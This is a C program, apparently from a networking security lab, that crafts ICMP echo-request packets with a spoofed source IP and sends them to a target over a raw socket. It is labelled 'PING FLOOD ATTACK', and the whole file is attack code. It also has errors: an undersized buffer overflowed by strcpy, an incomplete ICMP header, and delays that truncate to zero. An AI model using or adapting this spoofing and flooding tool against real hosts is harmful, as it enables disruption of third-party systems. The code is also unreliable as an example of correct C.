#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

struct ipheader {
  unsigned char headerLength:4, version:4;
  unsigned short int packetLength;
  unsigned char timeLeft;
  unsigned char protocol;
  struct  in_addr attackerIP;
  struct  in_addr targetIP;
};

struct icmpheader {
  unsigned char message_type;
  unsigned short int checksum;
};

unsigned short calculateChecksum (unsigned short *buf, int length);


unsigned short calculateChecksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   sum = (sum >> 16) + (sum & 0xffff); 
   sum += (sum >> 16);                
   return (unsigned short)(~sum);
}



int main(int argc, char const *argv[])
{
	char arr[2000];

	if (argc < 3)
	{
		printf("Please enter attacker ip and target ip\n");
		return -1;
	}

	printf("Attacker IP: %s\n", argv[1]);
	printf("Target IP: %s\n", argv[2]);

	char attackerIp[strlen(argv[1])], targetIp[strlen(argv[2])];
	strcpy(attackerIp, argv[1]);
	strcpy(targetIp, argv[2]);

	memset(arr, 0, 2000);
	strcpy(arr + sizeof(struct icmpheader) + sizeof(ipheader), "PING FLOOD ATTACK");

	unsigned int delay = 0.5;
	
	struct ipheader * iphead = (struct ipheader *) arr;
	iphead -> version = 4;
	iphead -> headerLength = 5;
	iphead -> timeLeft = 200;
	iphead -> attackerIP.s_addr = inet_addr(attackerIp);
	iphead -> targetIP.s_addr = inet_addr(targetIp);
	iphead -> protocol = IPPROTO_ICMP;
	iphead -> packetLength = htons(sizeof(struct ipheader) + sizeof(struct icmpheader) + strlen("PING FLOOD ATTACK"));

	struct icmpheader *icmphead = (struct icmpheader *) (arr + sizeof(struct ipheader));
	icmphead -> message_type = 8; //ICMP TYPE 8 == REQUEST, ICMP TYPE 0 == REPLY
	icmphead -> checksum = calculateChecksum((unsigned short *)icmphead, sizeof(struct icmpheader) + strlen("PING FLOOD ATTACK"));

	printf("checksum = %d\n", ntohs(icmphead -> checksum));
	
	for (int i = 0; i < 5; ++i)
	{
		printf("Packet Number: %d\n", i);
		printf("-------Start Sending Packet------\n");

		struct sockaddr_in dest_info;
	    int temp = 1;

	    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	    int setopt = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &temp, sizeof(temp));
	    dest_info.sin_family = AF_INET;
	    dest_info.sin_addr = iphead -> targetIP;
	    int sendopt =  sendto(sock, iphead, ntohs(iphead -> packetLength), 0, (struct sockaddr *)&dest_info, sizeof(dest_info));

	    if(sock < 0 || setopt < 0 || sendopt < 0){
	      printf("Couldn't configure socket\n");
	      printf("%d::%d::%d\n", AF_INET, SOCK_RAW, IPPROTO_RAW);
	      break;
	    }

	    close(sock);

	    printf("-------Packet Sent------\n");

		while(delay) {
			delay = sleep(delay);
		}
		delay = 0.2;
	}
	
	return 0;
}